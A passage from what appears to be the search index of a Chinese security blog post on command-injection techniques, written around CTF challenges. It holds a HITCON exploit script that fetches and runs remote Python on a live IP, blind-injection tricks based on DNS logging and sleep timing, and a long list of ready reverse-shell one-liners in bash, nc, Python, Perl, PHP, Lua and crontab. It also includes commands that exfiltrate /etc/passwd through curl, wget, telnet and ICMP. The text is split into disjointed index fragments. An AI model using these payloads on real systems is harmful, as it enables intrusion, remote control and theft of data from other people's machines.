time import sleep from urllib import quote payload = [ # generate \"g> ht- sl\" to file \"v\" '>dir', '>sl', '>g\\>', '>ht-', '*>v', # reverse file \"v\" to file \"x\", content \"ls -th >g\" '>rev', '*v>x', # generate \"curl orange.tw|python;\" '>\\;\\\\', '>on\\\\', '>th\\\\', '>py\\\\', '>\\|\\\\', '>tw\\\\', '>e.\\\\', '>ng\\\\', '>ra\\\\', '>o\\\\', '>\\ \\\\', '>rl\\\\', '>cu\\\\', # got shell 'sh x', 'sh g', ] r = requests.get('http://52.197.41.31/?reset=1') for i in payload: assert len(i) <= 4 r = requests.get('http://52.197.41.31/?cmd=' + quote(i) ) print i sleep(0.1) \u76f8\u5173Writeup: Baby First Revenge v2 (Via vim) by @bennofs [python] baby-exp.py How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2 HITCON CTF 2017 BabyFirst Revenge & v2 writeup \u65e0\u56de\u663e\u7684\u547d\u4ee4\u6ce8\u5165 \u6211\u4eec\u4e4b\u524d\u63d0\u5230\u7684\u5927\u90e8\u5206\u90fd\u662f\u6709\u56de\u663e\u6216\u8005\u4e00\u90e8\u5206\u63d0\u793a\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u5f53\u6211\u4eec\u9047\u5230\u65e0\u56de\u663e\u7684\u547d\u4ee4\u6ce8\u5165\u7684\u65f6\u5019\u6211\u4eec\u53c8\u8981\u600e\u4e48\u529e\u5462\uff1f DNS Log \u9879\u76ee\u5730\u5740\uff1a BugScanTeam/DNSLog \u5bf9\u4e8e\u4e00\u4e9b\u547d\u4ee4\u76f2\u6ce8\u7c7b\u7684\u6f0f\u6d1e\uff0c\u8fd9\u901a\u5e38\u662f\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3a\u901a\u5e38\u51fa\u7ad9DNS\u6d41\u91cf\u4e0d\u4f1a\u88ab\u963b\u6b62\u53ef\u4ee5\u901a\u8fc7\uff0cDNSLog \u4e2d\u7684 WebLog \u90e8\u5206\u5c06\u5176\u8f6c\u5316\u4e3a\u6709\u56de\u663e\u7684\u547d\u4ee4\u6267\u884c\uff1a curl \"http://testhash.test.dnslog.link/?`whoami`\" \u8fd9\u4e2a\u7528\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0c\u76f4\u63a5\u53bb\u67e5\u770b\u5bf9\u5e94\u7684\u8bb0\u5f55\u5c31\u597d\u4e86\u3002 \u6709\u65f6\u5019\u4f60\u9700\u8981\u7f16\u7801\u60f3\u8981\u8bfb\u51fa\u6765\u7684\u5185\u5bb9\uff0c\u8fd9\u6837\u624d\u4e0d\u4f1a\u7531\u4e8e\u4e00\u4e9b\u7a7a\u683c\u6216\u8005\u4ec0\u4e48\u5176\u4ed6\u5b57\u7b26\u5bfc\u81f4\u8bfb\u4e0d\u5b8c\u6574\u6570\u636e\u3002 \u8fd9\u91cc\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u547d\u4ee4\u6ce8\u5165\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e xss \u7b49\u5176\u4ed6\u4e00\u4e9b\u65e0\u56de\u663e\u7684\u653b\u51fb\u3002 \u8fd9\u91cc\u518d\u7ed9\u4e2a\u8d70 udp \u6d41\u91cf\u7684\u793a\u4f8b Only OB DNS traffic (UDP/53) allowed and can exec commands? Use dig `cut -d: -s -f1 /etc/passwd | sed 10\\!d` @ip to offload file contents. \u670d\u52a1\u7aef\uff1a nc -l -n -vv -p 53 -u -k(\u5982\u679c\u4e0d\u652f\u6301-k\u4e5f\u53ef\u4ee5\u4e0d\u7528-k) Same: {dig,`{cut,-d:,-s,-f1,/etc/passwd}|{sed,2\\!d}`,@ip} sleep \u68c0\u6d4b\u662f\u5426\u6709\u547d\u4ee4\u6ce8\u5165\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528 sleep \uff0c\u5e76\u89c2\u5bdf\u5176\u6267\u884c\u65f6\u95f4\u662f\u5426\u589e\u52a0\u3002 $ time ruby ping.rb '8.8.8.8' PING 8.8.8.8 (8.8.8.8): 56 data bytes ... 0.09s user 0.04s system 4% cpu 3.176 total $ time ruby ping.rb '8.8.8.8 && sleep 5' PING 8.8.8.8 (8.8.8.8): 56 data bytes ... 0.10s user 0.04s system 1% cpu 8.182 total \u53ef\u4ee5\u770b\u51fa\u5982\u679c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\uff0c\u6267\u884c\u65f6\u95f4\u4f1a\u6309\u7167\u6211\u4eec sleep \u7684\u53c2\u6570\u589e\u52a0\uff0c\u6211\u4eec\u8fd9\u91cc\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u524d\u9762\u5355\u5f15\u53f7\u4e0e\u53cc\u5f15\u53f7\u7684\u533a\u522b\uff0c\u4ee5\u4e0b\u90fd\u9700\u8981 \u53bb\u6389\u53cd\u659c\u6760 \uff08\u4e3b\u9898\u6709\u70b9\u602a \u547d\u4ee4 \u7ed3\u679c {% raw %} ping -c 4 8.8.8.8 sleep 5 {% endraw %} sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u547d\u4ee4\u884c\u4e2d\u3002 {% raw %} ping -c 4 \u201c8.8.8.8 sleep 5 \u201d {% endraw %} sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u590d\u6742\u7684\u5b57\u7b26\u4e32\u53cc\u5f15\u53f7\u4e4b\u95f4\u3002 {% raw %}ping -c 4 $(echo 8.8.8.8 sleep 5 ){% endraw %} sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u4f7f\u7528\u4e0d\u540c\u7b26\u53f7\u65f6\u3002 {% raw %}ping -c 4 \u20188.8.8.8 sleep 5 '{% endraw %} sleep\u547d\u4ee4\u4e0d\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u7b80\u5355\u5b57\u7b26\u4e32\u4e2d\u4e0d\u8d77\u4f5c\u7528\uff08\u5355\u5f15\u53f7\u4e4b\u95f4\uff09\u3002 {% raw %}ping -c 4 echo 8.8.8.8 sleep 5``{% endraw %} sleep\u547d\u4ee4\u4e0d\u6267\u884c\uff0c\u4f7f\u7528\u76f8\u540c\u7b26\u53f7\u65f6\u547d\u4ee4\u66ff\u6362\u4e0d\u8d77\u4f5c\u7528\u3002 ping -c 4 8.8.8.8;sleep 5 sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u5728\u547d\u4ee4\u884c\u4e2d\u987a\u5e8f\u6267\u884c\u3002 ping -c 4 \u201c8.8.8.8;sleep 5\u201d sleep\u547d\u4ee4\u672a\u88ab\u6267\u884c\uff0c\u9644\u52a0\u547d\u4ee4\u88ab\u6ce8\u5165\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u8be5\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9ping\u547d\u4ee4\u3002 ping -c 4 $(echo 8.8.8.8;sleep 5) sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u6392\u5e8f\u547d\u4ee4\u5728\u547d\u4ee4\u66ff\u6362\u4e2d\u8d77\u4f5c\u7528\u3002 ping -c 4 \u20188.8.8.8;sleep 5\u2019 sleep\u547d\u4ee4\u672a\u88ab\u6267\u884c\uff0c \u9644\u52a0\u547d\u4ee4\u88ab\u6ce8\u5165\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u8be5\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9ping\u547d\u4ee4\u3002 ping -c 4 echo 8.8.8.8;sleep 5 sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u6392\u5e8f\u547d\u4ee4\u5728\u547d\u4ee4\u66ff\u6362\u4e2d\u8d77\u4f5c\u7528\u3002 ping -c 4 8.8.8.8 sleep 5 ping -c 4 \u201c8.8.8.8 sleep 5\u201d ping -c 4 $(echo 8.8.8.8 sleep 5) ping -c 4 \u20188.8.8.8 sleep 5\u2019 ping -c 4 echo 8.8.8.8 | sleep 5 sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u7ba1\u9053\u8f93\u51fa\u5728\u547d\u4ee4\u66ff\u6362\u4e2d\u8d77\u4f5c\u7528\u3002 \u9664\u4e86\u63a2\u6d4b\u662f\u5426\u6709\u547d\u4ee4\u6ce8\u5165\u4e4b\u5916\uff0c sleep \u8fd8\u6709\u4e00\u4e2a\u53ef\u4ee5\u7528\u4e8e\u547d\u4ee4\u76f2\u6ce8\u7684\u65b9\u6cd5\u3002 sleep $(hostname | cut -c 1 | tr a 5) 1. \u6211\u4eec\u6267\u884c\u7684\u547d\u4ee4\u4e3a hostname \u3002\u6211\u4eec\u5047\u8bbe\u5b83\u8fd4\u56de hacker.local \u3002 2. \u5b83\u9700\u8981\u8f93\u51fa\u5e76\u5c06\u5176\u4f20\u9012\u7ed9 cut -c 1 \u3002\u8fd9\u5c06\u9009\u53d6 hacker.local \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26h\u3002 3. \u63a5\u7740\u901a\u8fc7tr\u547d\u4ee4\u5c06\u5b57\u7b26 a \u66ff\u6362\u4e3a5\u3002 4. \u7136\u540e\u5c06tr\u547d\u4ee4\u7684\u8f93\u51fa\u4f20\u9012\u7ed9 sleep \u547d\u4ee4\uff0c sleep h \u88ab\u6267\u884c\u5c06\u4f1a\u7acb\u5373\u51fa\u73b0\u62a5\u9519\uff0c\u8fd9\u662f\u56e0\u4e3a sleep \u540e\u8ddf\u7684\u53c2\u6570\u667a\u80fd\u4e3a\u4e00\u4e2a\u6570\u5b57\u3002\u7136\u540e\uff0c\u76ee\u6807\u4f7f\u7528tr\u547d\u4ee4\u8fed\u4ee3\u5b57\u7b26\u3002\u6267\u884c sleep $(hostname | cut -c 1 | tr h 5) \u547d\u4ee4\uff0c\u5c06\u9700\u89815\u79d2\u949f\u7684\u65f6\u95f4\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e00\u4e2ah\u3002\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6211\u4eec\u5c31\u80fd\u5c06\u5b8c\u6574\u7684\u4e3b\u673a\u540d\u731c\u89e3\u51fa\u6765\u3002 \u5f53\u7136\uff0c\u8fd9\u4e2a\u5229\u7528\u6761\u4ef6\u53ef\u80fd\u5bf9\u7f51\u7edc\u73af\u5883\u8981\u6c42\u6bd4\u8f83\u9ad8\uff0c\u4f46\u662f\u4f9d\u9760\u54cd\u5e94\u65f6\u95f4\u7684\u76f8\u5bf9\u65f6\u95f4\u6765\u5224\u65ad\uff0c\u4e5f\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5224\u65ad\u7684\uff0c\u6d4b\u8bd5\u793a\u4f8b\uff1a \u547d\u4ee4 \u65f6\u95f4 \u7ed3\u679c ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 1 tr a 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 1 tr h 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 2 tr a 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 3 tr a 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 3 tr c 5)\u2019 \u5982\u679c\u60f3\u8981\u77e5\u9053\u76ee\u6807\u4e3b\u673a\u540d\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u4e3b\u673a\u540d\u7684\u8f93\u51fa\u901a\u8fc7\u7ba1\u9053\u7b26\u4f20\u9012\u7ed9 wc -c \u547d\u4ee4\u3002 hacker.local \u4e3a 12 \u4e2a\u5b57\u7b26\u3002 hostname \u547d\u4ee4\u8fd4\u56de\u4e3b\u673a\u540d\u548c\u4e00\u4e2a\u65b0\u884c\uff0c\u56e0\u6b64 wc -c \u5c06\u663e\u793a13\u4e2a\u5b57\u7b26\u3002\u7ecf\u8fc7\u6211\u4eec\u6d4b\u8bd5\uff0c\u811a\u672c\u7684\u6267\u884c\u65f6\u95f4\u6700\u77ed\u9700\u89813\u79d2\u949f\u3002 $ time ruby server-online.rb '8.8.8.8 && sleep $(hostname | wc -c)' yes 0.10s user 0.04s system 0% cpu 16.188 total \u53ef\u4ee5\u770b\u5230\u4ee5\u4e0a\u7684payload\u811a\u672c\u5171\u7528\u65f616\u79d2\u624d\u6267\u884c\u5b8c\u6210\uff0c\u8fd9\u610f\u5473\u7740\u4e3b\u673a\u540d\u4e3a12\u4e2a\u5b57\u7b26\uff1a16 \u2013 3 (\u539f\u65f6\u95f4) \u2013 1 (\u65b0\u884c) = 12\u4e2a\u5b57\u7b26\u3002\u5f53\u5728Web\u670d\u52a1\u5668\u4e0a\u6267\u884c\u6b64payload\u65f6\uff0c\u8f93\u51fa\u7ed3\u679c\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff1a\u5f53\u8bf7\u6c42\u7531\u4e0d\u540c\u7684\u670d\u52a1\u5668\u5904\u7406\u65f6\uff0c\u4e3b\u673a\u540d\u7684\u957f\u5ea6\u4e5f\u53ef\u80fd\u4f1a\u6539\u53d8\u3002 \u672c\u6b21 NUAACTF \u6211\u4e5f\u662f\u4ece\u8fd9\u91cc\u51fa\u4e86\u4e00\u4e2a\u70b9\uff0c\u5f3a\u8feb\u4f7f\u7528 sleep $(xxx) \u6765\u8bfb\u53d6 flag \u3002 \u4f7f\u7528\u66b4\u9732\u7684\u670d\u52a1 \u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u5e76\u4e14\u57fa\u4e8e\u66b4\u9732\u7684\u670d\u52a1\u786e\u5b9a\u63d0\u53d6\u8f93\u51fa\u7684\u65b9\u5f0f\u3002 FTP \uff1a\u5c1d\u8bd5\u5c06\u6587\u4ef6\u5199\u5165\u53ef\u4ee5\u4ece\u4e2d\u4e0b\u8f7d\u6587\u4ef6\u7684\u76ee\u5f55\u3002 SSH \uff1a\u5c1d\u8bd5\u5c06\u547d\u4ee4\u7684\u8f93\u51fa\u5199\u5165MOTD banner\uff0c\u7136\u540e\u53ea\u9700SSH\u5230\u670d\u52a1\u5668\u3002 Web \uff1a\u5c1d\u8bd5\u5c06\u547d\u4ee4\u7684\u8f93\u51fa\u5199\u5165\u516c\u5171\u76ee\u5f55\uff08/var/www/\uff09\u4e2d\u3002 \u53cd\u5f39shell \u4e0d\u8fc7\u65e0\u8bba\u600e\u4e48\u73a9\uff0c\u8fd8\u662f\u76f4\u63a5\u5f39\u56de\u4e00\u4e2a shell \u6765\u6700\u5b9e\u7528\uff0c\u4e8e\u662f\u53ef\u4ee5\u6709 bash \u65b9\u5f0f bash -c \"sh >& /dev/tcp/your ip/port 0>&1\" exec \u65b9\u5f0f $ exec 5<>/dev/tcp/ip/port $ cat <&5 | while read line; do $line 2>&5 >&5; done nc \u65b9\u5f0f \u672c\u673a\u8fd0\u884c nc -l -vv -p port \u76ee\u6807\u4e3b\u673a nc -e /bin/bash ip port \u53e6\u4e00\u79cd nc \u65b9\u5f0f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f \u6216\u8005 mknod backpipe p && nc ip port 0<backpipe | /bin/bash 1>backpipe \u6216\u8005 /bin/sh | nc \u53d7\u5bb3\u8005ip port #\u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u9700\u8981\u5728\u4f60\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u8fd0\u884c python \u65b9\u5f0f python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \u53e6\u4e00\u79cd python -c \"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\" Perl \u65b9\u5f0f perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' php \u65b9\u5f0f php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/sh -i <&3 >&3 2>&3\");' lua \u65b9\u5f0f lua -e \"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i <&3 >&3 2>&3');\" #\u9700\u8981lua socket\u652f\u6301\uff0c\u4e14lua5.2+\u4e0d\u652f\u6301luasocket crontab \u65b9\u5f0f crontab -e \u7f16\u8f91\u5f53\u524d\u7528\u6237\u7684\u4efb\u52a1\uff0c\u6216\u8005\u662f\u5199\u5230\u8ba1\u5212\u4efb\u52a1\u76ee\u5f55\uff0c\u4e00\u822c\u662f /var/spool/cron/ \u76ee\u5f55\uff0c ubuntu \u662f / var/spool/cron/crontabs \u3002\u6587\u4ef6\u540d\u4e3a\u7528\u6237\u540d root \u7b49\u3002\u4e0b\u9762\u547d\u4ee4\u542b\u4e49\u662f\u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21\u53cd\u5f39 shell \u547d\u4ee4\u3002 SHELL=/bin/bash * * * * * /bin/bash -i >& /dev/tcp/ip/port 0>&1 telnet \u65b9\u5f0f mknod backpipe p && telnet ip port 0<backpipe | /bin/bash 1>backpipe msf \u65b9\u5f0f\u6709\u5f88\u591a\u79cd\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u63d0\u4e86\u3002 Trick \u65e0\u7a7a\u683c\uff1a ping -c 4 8.8.8.8;hostname|{nc,ip,port} \u4f7f\u7528 nc \u5c06\u6587\u4ef6\u91cd\u5b9a\u5411\uff1a \u9776\u673a\u4e0a nc -lvp port < /etc/passwd \u672c\u673a\u76f4\u63a5 nc ip port \u5f97\u5230\u6587\u4ef6\u5185\u5bb9 \u4f7f\u7528 http \u534f\u8bae\uff0c\u901a\u8fc7 curl \uff1a curl http://ip:port -F a=@/etc/passwd \u540c\u6837\u53ef\u4ee5\u901a\u8fc7 curl \u4f7f\u7528 ftp \u534f\u8bae\uff0c\u540c\u7406 wget \u3001 telnet \u5f53\u7136\u4e5f\u662f\u53ef\u4ee5\u7684 wget --post-data=\"`cat /etc/passwd`\" http://ip:port wget --post-file=/etc/passwd http://ip:port telnet 106.14.153.173 2015 < /etc/passwd \u4f7f\u7528 ICMP \u62a5\u6587 cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done \u66f4\u6b63 2019/2/13\uff0c\u66f4\u6b63\u4e86\u6587\u7ae0\u51e0\u5904\u9519\u8bef\uff0c\u5df2\u66f4\u65b0\u6587\u7ae0\u5185\u5bb9\u9519\u8bef\u5904 $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") #\u53ef\u4ee5\u6267\u884c \u53c2\u8003 Web Application Firewall (WAF) Evasion Techniques Command Injection - OWASP coomix Web \u5b89\u5168\u6f0f\u6d1e\u4e4b OS \u547d\u4ee4\u6ce8\u5165 linux\u7279\u6b8a\u7b26\u53f7\u5927\u5168 \u5c0f\u5bc6\u5708\u4e13\u9898(2)-\u547d\u4ee4\u6267\u884c\u7ed5\u8fc7 linux bash shell\u4e2d\uff0c\u5355\u5f15\u53f7\u3001 \u53cc\u5f15\u53f7\uff0c\u53cd\u5f15\u53f7\uff08``\uff09\u7684\u533a\u522b\u53ca\u5404\u79cd\u62ec\u53f7\u7684\u533a\u522b \u7531ISCC2018-Web-Ping\u5b66\u4e60\u547d\u4ee4\u6ce8\u5165 shelling HITCON CTF 2017-BabyFirst Revenge-writeup LINUX\u4e0b\u53cd\u5f39SHELL\u7684\u79cd\u79cd\u65b9\u5f0f Linux\u6e17\u900f\u4e4b\u53cd\u5f39Shell\u547d\u4ee4\u89e3\u6790 \u6280\u672f\u5206\u6790\uff1a\u653b\u51fb\u8005\u662f\u5982\u4f55\u5229\u7528\u7cfb\u7edf\u547d\u4ee4\u76f2\u6ce8\u5b9e\u73b0\u201c\u62d6\u5e93\u201d\u7684\uff1f \u539f\u6587\u94fe\u63a5\uff1a https://blog.zeddyu.info/2019/01/17/\u547d\u4ee4\u6267\u884c/","title":"\u5de7\u7528\u547d\u4ee4\u6ce8\u5165\u7684N\u79cd\u65b9\u5f0f"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#n","text":"\u200b \u672c\u6587\u9996\u53d1\u4e8e\u8865\u5929\u5e73\u53f0\uff0c\u5730\u5740\uff1ahttps://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw \u5728 NUAACTF_2018 \u4e2d\uff0c\u6211\u51fa\u4e86\u4e00\u9053\u6bd4\u8f83\u6c34\u7684\u91c7\u7528 Spring \u6846\u67b6\u7684 SSRF + Java Deserialization + Command Injection \u3002\u4e2a\u4eba\u89c9\u5f97\u5728\u51fa\u9898\u65f6\u5019\u4e5f\u5b66\u4e60\u5230\u4e86\u4e0d\u5c11\u77e5\u8bc6\uff0c\u7279\u522b\u662f\u5728 Command Injection \u8fd9\u4e00\u5757\u8ba9\u6211\u5bf9 Command Injection \u6709\u4e86\u65b0\u7684\u770b\u6cd5\u3002","title":"\u5de7\u7528\u547d\u4ee4\u6ce8\u5165\u7684N\u79cd\u65b9\u5f0f"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_1","text":"","title":"\u547d\u4ee4\u6267\u884c"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_2","text":"Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. This attack differs from Code Injection , in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. \u4ee5\u4e0a\u6765\u81ea Command Injection - OWASP \uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\u901a\u8fc7\u6613\u53d7\u653b\u51fb\u7684\u5e94\u7528\u7a0b\u5e8f\u5728\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u5c06\u4e0d\u5b89\u5168\u7684\u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\uff08\u8868\u5355\uff0ccookie\uff0cHTTP\u6807\u5934\u7b49\uff09\u4f20\u9012\u7ed9\u7cfb\u7edfshell\u65f6\uff0c\u53ef\u80fd\u4f1a\u53d1\u751f\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u3002 \u5728\u6b64\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u901a\u5e38\u4ee5\u6613\u53d7\u653b\u51fb\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u6743\u9650\u6267\u884c\u3002 \u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u5f88\u53ef\u80fd\u4e3b\u8981\u662f\u7531\u4e8e\u8f93\u5165\u9a8c\u8bc1\u4e0d\u8db3\u3002\u6b64\u653b\u51fb\u4e0e\u4ee3\u7801\u6ce8\u5165\u4e0d\u540c\uff0c\u56e0\u4e3a\u4ee3\u7801\u6ce8\u5165\u5141\u8bb8\u653b\u51fb\u8005\u6dfb\u52a0\u81ea\u5df1\u7684\u4ee3\u7801\uff0c\u7136\u540e\u7531\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u3002 \u5728\u547d\u4ee4\u6ce8\u5165\u4e2d\uff0c\u653b\u51fb\u8005\u6269\u5c55\u4e86\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u529f\u80fd\uff0c\u800c\u65e0\u9700\u6ce8\u5165\u4ee3\u7801\u3002 \u200b \u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u6700\u521d\u88ab\u79f0\u4e3aShell\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\uff0c\u662f\u7531\u632a\u5a01\u4e00\u540d\u7a0b\u5e8f\u5458\u57281997\u5e74\u610f\u5916\u53d1\u73b0\u7684\u3002\u7b2c\u4e00\u4e2a\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u7a0b\u5e8f\u80fd\u968f\u610f\u5730\u4ece\u4e00\u4e2a\u7f51\u7ad9\u5220\u9664\u7f51\u9875\uff0c\u5c31\u50cf\u4ece\u78c1\u76d8\u6216\u8005\u786c\u76d8\u79fb\u9664\u6587\u4ef6\u4e00\u6837\u7b80\u5355\u3002 \u2014\u2014\u767e\u5ea6\u767e\u79d1","title":"\u7406\u8bba\u57fa\u7840"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_3","text":"\u8bb2\u5230\u547d\u4ee4\u6ce8\u5165\uff0c\u5c31\u4e0d\u5f97\u4e0d\u63d0\u5230\u7279\u6b8a\u7b26\u53f7\u7684\u8fd0\u7528\u3002\u4f8b\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\u7684 | \u7ba1\u9053\u7b26\uff0c\u8fd8\u6709\u6bd4\u8f83\u591a\u7684\u7c7b\u4f3c\u6709\u5947\u6548\u7684\u7b26\u53f7\u7ec4\u5408\u3002","title":"\u7279\u6b8a\u7b26\u53f7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_4","text":"\u8fde\u7ed3\u4e0a\u4e2a\u6307\u4ee4\u7684\u6807\u51c6\u8f93\u51fa\uff0c\u505a\u4e3a\u4e0b\u4e2a\u6307\u4ee4\u7684\u6807\u51c6\u8f93\u5165\u3002","title":"|"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_5","text":"\u7528\u6237\u6709\u65f6\u5019\u6267\u884c\u547d\u4ee4\u8981\u82b1\u5f88\u957f\u65f6\u95f4\uff0c\u53ef\u80fd\u4f1a\u5f71\u54cd\u505a\u5176\u4ed6\u4e8b\u60c5\u3002\u6700\u597d\u7684\u65b9\u6cd5\u662f\u5c06\u5b83\u653e\u5728\u540e\u53f0\u6267\u884c\u3002\u540e\u53f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u5728\u7528\u6237\u6ce8\u9500\u540e\u7cfb\u7edf\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u3002\u5f53\u8981\u628a\u547d\u4ee4\u653e\u5728\u540e\u53f0\u6267\u884c\u65f6\uff0c\u5728\u547d\u4ee4\u7684\u540e\u9762\u52a0\u4e0a & \u3002","title":"&amp;"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#linux","text":"shell \u5728\u6267\u884c\u67d0\u4e2a\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u8fd4\u56de\u503c\uff0c\u8be5\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 shell \u53d8\u91cf $? \u4e2d\u3002\u5f53 $? == 0 \u65f6\uff0c\u8868\u793a\u6267\u884c\u6210\u529f\uff1b\u5f53 $? == 1 \u65f6\uff0c\u8868\u793a\u6267\u884c\u5931\u8d25\u3002\u6709\u65f6\u5019\uff0c\u4e0b\u4e00\u6761\u547d\u4ee4\u4f9d\u8d56\u524d\u4e00\u6761\u547d\u4ee4\u662f\u5426\u6267\u884c\u6210\u529f\u3002\u5982\uff1a\u5728\u6210\u529f\u5730\u6267\u884c\u4e00\u6761\u547d\u4ee4\u4e4b\u540e\u518d\u6267\u884c\u53e6\u4e00\u6761\u547d\u4ee4\uff0c\u6216\u8005\u5728\u4e00\u6761\u547d\u4ee4\u6267\u884c\u5931\u8d25\u540e\u518d\u6267\u884c\u53e6\u4e00\u6761\u547d\u4ee4\u7b49\u3002 shell \u63d0\u4f9b\u4e86 && \u548c || \u6765\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u63a7\u5236\u7684\u529f\u80fd\uff0c shell \u5c06\u6839\u636e && \u6216 || 